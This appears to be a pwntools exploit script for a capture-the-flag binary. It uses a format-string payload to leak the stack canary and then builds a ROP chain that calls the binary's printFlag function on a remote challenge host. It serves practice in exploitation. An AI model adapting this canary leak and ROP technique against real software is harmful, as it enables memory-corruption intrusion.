#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './hmmhow' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '103.217.145.97', 7001 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break vuln
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================

def hexToFloat(h):
    h = hex(h)[2:].rjust(16, '0')
    d = struct.unpack('>d', bytes.fromhex(h))[0]
    return str(d)

def floatToHex(f):
    return hex(struct.unpack('>Q', struct.pack('>d', f))[0])


# =========================================================
#                         EXPLOITS
# =========================================================
def fuzz():
    for i in range(1, 100):
        io = initialize()
        io.sendlineafter('>', f'%{i}$f'.encode())
        io.recvuntil(b'Agent ')
        print(floatToHex(float(io.recvline().strip())), i)
        io.close()


def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    payload = b'%8$f|%9$f'
    # payload = b'%3$f'
    io.sendafter('>', payload)
    io.recvuntil(b'Agent ')
    
    leak = io.recvline().strip().split(b'|')
    leak = [floatToHex(float(x)) for x in leak]
    
    canary = int(leak[1], 16) >> 32
    info(f'canary: {hex(canary)}')

    rop.raw(cyclic(12))
    rop.raw(canary)
    rop.raw(cyclic(12))
    rop.call(elf.sym['printFlag'])
    info(f'rop len: {len(rop.chain())}')
    io.sendlineafter(b'>', rop.chain())
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()
    # fuzz()